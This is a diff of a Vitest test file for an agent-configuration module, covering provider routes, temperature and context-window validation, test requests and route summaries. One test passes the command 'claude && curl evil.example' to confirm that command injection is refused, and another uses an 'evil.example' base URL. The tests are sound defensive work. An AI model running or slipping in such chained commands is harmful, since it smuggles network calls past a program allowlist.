@@ -1,6 +1,8 @@
 import { describe, expect, it } from "vitest";
+import { PROVIDER_ERRORS } from "../shared/provider-request.js";
 import {
   emptyConfigStatus,
+  emptyTuning,
   MAX_AGENTS,
   MAX_AGENT_NAME_LENGTH,
   MAX_MODEL_LENGTH,
@@ -12,10 +14,14 @@ import {
   agentKeySource,
   agentKeySummary,
   agentReadiness,
+  agentTestRequest,
   canCreateAgent,
   canDeleteAgent,
   canSaveAgent,
   canSaveOrchestrator,
+  canSaveTuning,
+  canTestAgent,
+  contextWindowPlaceholder,
   draftCommandPlaceholder,
   draftFrom,
   draftIsCli,
@@ -23,18 +29,28 @@ import {
   draftNeedsBaseUrl,
   draftNeedsModel,
   draftRole,
+  draftRouteSummary,
   emptyDraft,
+  emptyTuningDraft,
   isValidBaseUrl,
   isValidCommand,
+  isValidContextWindow,
   isValidModel,
+  isValidTemperature,
   orchestratorDraftFrom,
+  orchestratorRouteSummary,
   providerName,
   providerReady,
   providerSummary,
   providerStatusFor,
   routeSummary,
   slugifyRole,
+  testSummary,
   toCompanionDraft,
+  toModelTuning,
+  tuningChanged,
+  tuningDraftFor,
+  tuningDraftFrom,
   type AgentDraft,
   type OrchestratorDraft
 } from "./command-center.js";
@@ -49,6 +65,7 @@ function companion(overrides: Partial<AgentCompanion> = {}): AgentCompanion {
     model: null,
     baseUrl: null,
     command: null,
+    tuning: emptyTuning(),
     ...overrides
   };
 }
@@ -320,7 +337,7 @@ describe("canSaveOrchestrator on a CLI", () => {
   it("applies with no model, since the tool picks one", () => {
     expect(
       canSaveOrchestrator(
-        { provider: "claude-code", model: "", baseUrl: "", command: "" },
+        { provider: "claude-code", model: "", baseUrl: "", command: "", tuning: emptyTuningDraft() },
         config()
       )
     ).toBe(true);
@@ -333,7 +350,8 @@ describe("canSaveOrchestrator on a CLI", () => {
           provider: "claude-code",
           model: "",
           baseUrl: "",
-          command: "claude && curl evil.example"
+          command: "claude && curl evil.example",
+          tuning: emptyTuningDraft()
         },
         config()
       )
@@ -378,7 +396,8 @@ describe("toCompanionDraft", () => {
         provider: null,
         model: null,
         baseUrl: null,
-        command: null
+        command: null,
+        tuning: emptyTuning()
       }
     );
   });
@@ -400,7 +419,8 @@ describe("draftFrom", () => {
       provider: "openai",
       model: "gpt-5",
       baseUrl: null,
-      command: null
+      command: null,
+      tuning: emptyTuning()
     });
   });
 
@@ -535,6 +555,7 @@ describe("canSaveOrchestrator", () => {
     model: "claude-opus-5",
     baseUrl: "",
     command: "",
+    tuning: emptyTuningDraft(),
     ...overrides
   });
 
@@ -668,3 +689,479 @@ describe("roster bounds", () => {
     expect(canDeleteAgent(roster(2))).toBe(true);
   });
 });
+
+describe("isValidContextWindow", () => {
+  it("accepts an empty box, which means the provider's own", () => {
+    expect(isValidContextWindow("")).toBe(true);
+    expect(isValidContextWindow("   ")).toBe(true);
+  });
+
+  it("accepts a whole number of tokens inside the contract bounds", () => {
+    expect(isValidContextWindow("128000")).toBe(true);
+    expect(isValidContextWindow(" 8192 ")).toBe(true);
+  });
+
+  it("refuses anything that is not a plain count of tokens", () => {
+    for (const text of ["12.5", "-4096", "8k", "1e6", "128,000", "0x10"]) {
+      expect(isValidContextWindow(text)).toBe(false);
+    }
+  });
+
+  it("refuses a number outside what the contract will store", () => {
+    expect(isValidContextWindow("512")).toBe(false);
+    expect(isValidContextWindow("99999999")).toBe(false);
+  });
+});
+
+describe("isValidTemperature", () => {
+  it("accepts an empty box, which sends no temperature at all", () => {
+    expect(isValidTemperature("")).toBe(true);
+  });
+
+  it("accepts the range every provider here documents", () => {
+    for (const text of ["0", "0.2", "1", "2", "1.75"]) {
+      expect(isValidTemperature(text)).toBe(true);
+    }
+  });
+
+  it("refuses a value outside it rather than clamping", () => {
+    // Clamping would give the user a temperature they did not ask for with
+    // nothing on screen saying so.
+    expect(isValidTemperature("2.1")).toBe(false);
+    expect(isValidTemperature("-1")).toBe(false);
+  });
+
+  it("refuses text a number input would still hand over", () => {
+    for (const text of ["abc", "0.2.2", "1e0", ".5"]) {
+      expect(isValidTemperature(text)).toBe(false);
+    }
+  });
+});
+
+describe("tuningDraftFor", () => {
+  it("prefills the two settings the preset actually knows", () => {
+    const filled = tuningDraftFor("anthropic");
+
+    expect(filled.supportsImages).toBe(true);
+    expect(filled.contextWindow).toBe("200000");
+    // Temperature is nobody's default to guess, so the box starts empty and the
+    // request carries none.
+    expect(filled.temperature).toBe("");
+    expect(filled.providerLabel).toBe("");
+  });
+
+  it("leaves the window empty where the preset cannot know one", () => {
+    expect(tuningDraftFor("openai-compatible").contextWindow).toBe("");
+    expect(tuningDraftFor("claude-code").contextWindow).toBe("");
+  });
+
+  it("says nothing at all for a route that follows the orchestrator", () => {
+    expect(tuningDraftFor(null)).toEqual(emptyTuningDraft());
+  });
+});
+
+describe("toModelTuning", () => {
+  it("normalises empty boxes back to the contract's nulls", () => {
+    expect(toModelTuning("openai", emptyTuningDraft())).toEqual({
+      providerLabel: null,
+      supportsImages: null,
+      contextWindow: null,
+      temperature: null
+    });
+  });
+
+  it("keeps a name the user typed", () => {
+    expect(
+      toModelTuning("openai", { ...emptyTuningDraft(), providerLabel: " Team key " })
+        .providerLabel
+    ).toBe("Team key");
+  });
+
+  it("treats a name identical to the provider's own as no name", () => {
+    // That is the placeholder left alone, not a name the user chose — storing it
+    // would pin the label against a preset that may be renamed later.
+    expect(
+      toModelTuning("openai", { ...emptyTuningDraft(), providerLabel: "OpenAI" })
+        .providerLabel
+    ).toBeNull();
+  });
+
+  it("stores nothing at all for a route that follows the orchestrator", () => {
+    expect(
+      toModelTuning(null, {
+        providerLabel: "Mine",
+        supportsImages: true,
+        contextWindow: "8192",
+        temperature: "0.5"
+      })
+    ).toEqual(emptyTuning());
+  });
+
+  it("drops a value the contract would refuse rather than sending it", () => {
+    const draft = { ...emptyTuningDraft(), contextWindow: "8k", temperature: "9" };
+
+    expect(toModelTuning("openai", draft).contextWindow).toBeNull();
+    expect(toModelTuning("openai", draft).temperature).toBeNull();
+  });
+
+  it("round-trips a saved setting through the form", () => {
+    const saved = {
+      providerLabel: "Team key",
+      supportsImages: false,
+      contextWindow: 8192,
+      temperature: 0.2
+    };
+
+    expect(toModelTuning("openai", tuningDraftFrom(saved))).toEqual(saved);
+  });
+});
+
+describe("canSaveTuning", () => {
+  it("is true for settings the contract will accept", () => {
+    expect(
+      canSaveTuning({
+        providerLabel: "Team",
+        supportsImages: true,
+        contextWindow: "8192",
+        temperature: "0.2"
+      })
+    ).toBe(true);
+  });
+
+  it("is false for a number the contract would refuse", () => {
+    expect(
+      canSaveTuning({ ...emptyTuningDraft(), temperature: "3" })
+    ).toBe(false);
+    expect(
+      canSaveTuning({ ...emptyTuningDraft(), contextWindow: "-1" })
+    ).toBe(false);
+  });
+});
+
+describe("tuningChanged", () => {
+  it("reads a differently written number as the same setting", () => {
+    // Otherwise Apply stays lit after a save and invites the user to wonder
+    // whether it landed.
+    expect(
+      tuningChanged("openai", { ...emptyTuningDraft(), temperature: "0.20" }, {
+        providerLabel: null,
+        supportsImages: null,
+        contextWindow: null,
+        temperature: 0.2
+      })
+    ).toBe(false);
+  });
+
+  it("notices a setting that actually moved", () => {
+    expect(
+      tuningChanged("openai", { ...emptyTuningDraft(), temperature: "0.4" }, emptyTuning())
+    ).toBe(true);
+  });
+});
+
+describe("canSaveAgent with model settings", () => {
+  it("refuses a draft whose settings the contract would reject", () => {
+    expect(
+      canSaveAgent(
+        draft({
+          provider: "openai",
+          model: "gpt-5",
+          tuning: { ...emptyTuningDraft(), temperature: "7" }
+        })
+      )
+    ).toBe(false);
+  });
+
+  it("still accepts one whose settings are simply unstated", () => {
+    expect(canSaveAgent(draft({ provider: "openai", model: "gpt-5" }))).toBe(true);
+  });
+});
+
+describe("contextWindowPlaceholder", () => {
+  it("offers the preset's number where there is one", () => {
+    expect(contextWindowPlaceholder("anthropic")).toBe("200000");
+  });
+
+  it("admits it does not know rather than inventing a figure", () => {
+    expect(contextWindowPlaceholder("openai-compatible")).toBe(
+      "Optional — the model's window in tokens"
+    );
+  });
+
+  it("says who is managing the context for a CLI", () => {
+    expect(contextWindowPlaceholder("claude-code")).toBe("Managed by the CLI");
+  });
+
+  it("points at the orchestrator for a route that follows it", () => {
+    expect(contextWindowPlaceholder(null)).toBe("Follows the orchestrator");
+  });
+});
+
+describe("canTestAgent", () => {
+  it("refuses a route that names no provider", () => {
+    // A test of "follows the orchestrator" would be a test of a different route
+    // than the one on screen.
+    expect(canTestAgent(draft({ provider: null }))).toBe(false);
+  });
+
+  it("refuses a configuration that could not be saved either", () => {
+    expect(canTestAgent(draft({ provider: "openai-compatible", model: "" }))).toBe(false);
+  });
+
+  it("accepts one that is complete", () => {
+    expect(
+      canTestAgent(
+        draft({
+          provider: "openai-compatible",
+          model: "llama-3.3",
+          baseUrl: "https://api.example.com/v1"
+        })
+      )
+    ).toBe(true);
+  });
+});
+
+describe("agentTestRequest", () => {
+  it("sends the route the form is showing, not the one that is saved", () => {
+    expect(
+      agentTestRequest(
+        draft({
+          provider: "openai-compatible",
+          model: " llama-3.3 ",
+          baseUrl: " https://api.example.com/v1 ",
+          tuning: { ...emptyTuningDraft(), temperature: "0.3" }
+        }),
+        "companion-1"
+      )
+    ).toEqual({
+      provider: "openai-compatible",
+      model: "llama-3.3",
+      baseUrl: "https://api.example.com/v1",
+      command: null,
+      tuning: {
+        providerLabel: null,
+        supportsImages: null,
+        contextWindow: null,
+        temperature: 0.3
+      },
+      companionId: "companion-1"
+    });
+  });
+
+  it("drops an endpoint the provider does not take, exactly as a save does", () => {
+    expect(
+      agentTestRequest(
+        draft({ provider: "openai", model: "gpt-5", baseUrl: "https://evil.example" }),
+        null
+      )?.baseUrl
+    ).toBeNull();
+  });
+
+  it("has nothing to send for a route that follows the orchestrator", () => {
+    expect(agentTestRequest(draft({ provider: null }), null)).toBeNull();
+  });
+
+  it("carries no field a credential could travel in", () => {
+    const request = agentTestRequest(draft({ provider: "openai", model: "gpt-5" }), null);
+
+    expect(request).not.toBeNull();
+    expect(Object.keys(request ?? {})).toEqual([
+      "provider",
+      "model",
+      "baseUrl",
+      "command",
+      "tuning",
+      "companionId"
+    ]);
+  });
+});
+
+describe("testSummary", () => {
+  it("says nothing before anything has been tried", () => {
+    expect(testSummary({ kind: "idle" })).toBeNull();
+  });
+
+  it("distinguishes not tried from tried and clean", () => {
+    expect(testSummary({ kind: "passed", elapsedMs: 412 })).toContain("412 ms");
+  });
+
+  it("never rounds a fast answer down to nothing", () => {
+    expect(testSummary({ kind: "passed", elapsedMs: 0 })).toContain("1 ms");
+  });
+
+  it("has wording of its own for every failure the transport can report", () => {
+    for (const code of PROVIDER_ERRORS) {
+      const line = testSummary({ kind: "failed", code });
+      expect(line).not.toBeNull();
+      expect((line ?? "").length).toBeGreaterThan(0);
+    }
+  });
+});
+
+describe("draftRouteSummary", () => {
+  it("describes the route being edited rather than the one that is saved", () => {
+    expect(
+      draftRouteSummary(
+        draft({ provider: "openai", model: "gpt-4.1" }),
+        config()
+      )
+    ).toBe("OpenAI · gpt-4.1");
+  });
+
+  it("uses the name the user gave this configuration", () => {
+    expect(
+      draftRouteSummary(
+        draft({
+          provider: "openai-compatible",
+          model: "llama-3.3",
+          baseUrl: "https://api.example.com/v1",
+          tuning: { ...emptyTuningDraft(), providerLabel: "Lab box" }
+        }),
+        config()
+      )
+    ).toBe("Lab box · llama-3.3 · api.example.com");
+  });
+
+  it("names the program for a CLI route, because that is what would run", () => {
+    expect(draftRouteSummary(draft({ provider: "claude-code" }), config())).toBe(
+      "Claude Code · claude"
+    );
+  });
+
+  it("says it follows the orchestrator once, not twice", () => {
+    /*
+     * `routeSummary(null, config)` resolves through the inherit path and ends in
+     * "follows orchestrator". Prefixing that produced a line that opened and
+     * closed with the same fact.
+     */
+    const line = draftRouteSummary(draft({ provider: null }), config());
+
+    expect(line).toBe("Follows the orchestrator · Anthropic · claude-opus-5");
+    expect(line.toLowerCase().match(/orchestrator/gu)).toHaveLength(1);
+  });
+});
+
+describe("routeSummary and the name a configuration was given", () => {
+  it("tells two routes of the same type apart in the roster", () => {
+    /*
+     * The exact confusion the Provider Name field exists to prevent: two agents
+     * pointed at different machines both reading "OpenAI-compatible". The roster
+     * is where they are read side by side, so it is where the name has to show.
+     */
+    const lab = companion({
+      provider: "openai-compatible",
+      model: "llama-3.3",
+      baseUrl: "https://lab.internal/v1",
+      tuning: { ...emptyTuning(), providerLabel: "Lab box" }
+    });
+    const prod = companion({
+      id: "companion-2",
+      provider: "openai-compatible",
+      model: "llama-3.3",
+      baseUrl: "https://prod.internal/v1",
+      tuning: { ...emptyTuning(), providerLabel: "Prod box" }
+    });
+
+    expect(routeSummary(lab, config())).toBe("Lab box · llama-3.3 · lab.internal");
+    expect(routeSummary(prod, config())).toBe("Prod box · llama-3.3 · prod.internal");
+  });
+
+  it("falls back to the provider's own name when none was given", () => {
+    expect(routeSummary(companion({ provider: "openai", model: "gpt-5" }), config())).toBe(
+      "OpenAI · gpt-5"
+    );
+  });
+
+  it("carries the name onto a CLI route too", () => {
+    expect(
+      routeSummary(
+        companion({
+          provider: "claude-code",
+          tuning: { ...emptyTuning(), providerLabel: "Work CLI" }
+        }),
+        config()
+      )
+    ).toBe("Work CLI · claude");
+  });
+
+  it("shows an inherited route under the orchestrator's name, not the agent's", () => {
+    // An unpinned agent stores no settings of its own, so the name it displays
+    // is the one the orchestrator is configured under.
+    const saved = config([], {
+      tuning: { ...emptyTuning(), providerLabel: "Work account" }
+    });
+
+    expect(routeSummary(companion({ provider: null }), saved)).toBe(
+      "Work account · claude-opus-5 · follows orchestrator"
+    );
+  });
+});
+
+describe("orchestratorRouteSummary", () => {
+  it("never says the orchestrator follows anything", () => {
+    // It is the thing being followed, so the suffix `routeSummary` adds for an
+    // inherited route is nonsense on its own row.
+    expect(orchestratorRouteSummary(config())).toBe("Anthropic · claude-opus-5");
+    expect(routeSummary(null, config())).toContain("follows orchestrator");
+  });
+
+  it("names the program when the orchestrator is on a CLI", () => {
+    expect(
+      orchestratorRouteSummary(
+        config([], { provider: "claude-code", model: "", command: null })
+      )
+    ).toBe("Claude Code · claude");
+  });
+
+  it("uses the name the user gave the configuration", () => {
+    expect(
+      orchestratorRouteSummary(
+        config([], { tuning: { ...emptyTuning(), providerLabel: "Work account" } })
+      )
+    ).toBe("Work account · claude-opus-5");
+  });
+
+  it("says so plainly when no model is set", () => {
+    expect(orchestratorRouteSummary(config([], { model: "" }))).toBe(
+      "Anthropic · no model set"
+    );
+  });
+});
+
+describe("testSummary on a CLI route", () => {
+  const cli = { isCli: true, command: "claude" };
+
+  it("never claims a provider answered, because none was called", () => {
+    /*
+     * A CLI route is checked against the allowlist rather than run, so a
+     * duration and an "answered" would both describe a request that was never
+     * made.
+     */
+    const line = testSummary({ kind: "passed", elapsedMs: 3 }, cli);
+
+    expect(line).toBe("claude is a program this build will run.");
+    expect(line).not.toContain("ms");
+    expect(line).not.toContain("answered");
+  });
+
+  it("says it is checking rather than trying", () => {
+    expect(testSummary({ kind: "running" }, cli)).toBe("Checking this program…");
+  });
+
+  it("keeps the request wording for an HTTP route", () => {
+    expect(testSummary({ kind: "passed", elapsedMs: 412 })).toContain("412 ms");
+  });
+
+  it("falls back rather than naming an empty program", () => {
+    expect(
+      testSummary({ kind: "passed", elapsedMs: 3 }, { isCli: true, command: "" })
+    ).toBe("That program is a program this build will run.");
+  });
+
+  it("reports a failure the same way whichever route it was", () => {
+    expect(testSummary({ kind: "failed", code: "command-not-allowed" }, cli)).toBe(
+      "That program is not one this app will run."
+    );
+  });
+});
+
